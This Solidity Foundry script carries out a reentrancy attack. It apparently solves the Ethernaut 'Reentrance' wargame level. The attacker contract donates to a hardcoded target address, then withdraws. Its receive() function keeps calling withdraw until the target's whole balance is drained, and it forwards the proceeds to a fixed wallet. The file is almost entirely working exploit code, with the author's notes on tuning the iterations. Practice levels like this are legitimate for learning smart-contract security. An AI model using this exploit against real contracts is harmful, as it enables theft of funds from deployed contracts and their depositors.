// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "contracts/interfaces/IReentrance.sol";

contract ReentranceAttack is Script {
    function run() public {
        vm.startBroadcast();
        // *note (balance in the target contract) / (initial deposit) is how many itters we do
        ReentranceAttacker attacker = new ReentranceAttacker{value: 9e14}();
        attacker.attack();
        vm.stopBroadcast();
    }
}

contract ReentranceAttacker {
    IReentrance targetContract = IReentrance(0x2cb76631dE26f815735400A053C98DD3641a864F);
    address payable returnAddr = payable(0x92703b74131dABA21d78eabFEf1156C7ffe81dE0);
    uint256 initialDeposit;

    constructor() payable {
        initialDeposit = address(this).balance;
        console.log("initial deposit ", initialDeposit);
        // *note Below was my first intuition however it seems when run like below the recieve() is not invoked
        // uint256 balance = address(this).balance;
        // targetContract.donate{value: balance}(address(this));
        // targetContract.withdraw(balance);
    }

    function attack() public {
        targetContract.donate{value: initialDeposit}(address(this));
        targetContract.withdraw(initialDeposit);
        // make sure to refund ourselves
        rescue();
    }

    function callWithdraw() internal {
        console.log("attempting to withdraw with balance", address(targetContract).balance);
        uint256 balanceLeft = address(targetContract).balance;
        bool keepRecursing = balanceLeft > 0;

        if (keepRecursing) {
            uint256 toWithdraw = initialDeposit < balanceLeft ? initialDeposit : balanceLeft;
            targetContract.withdraw(toWithdraw);
        }
    }

    function rescue() public {
        returnAddr.send(address(this).balance);
    }

    receive() external payable {
        console.log("receive function entered");
        callWithdraw();
    }
}
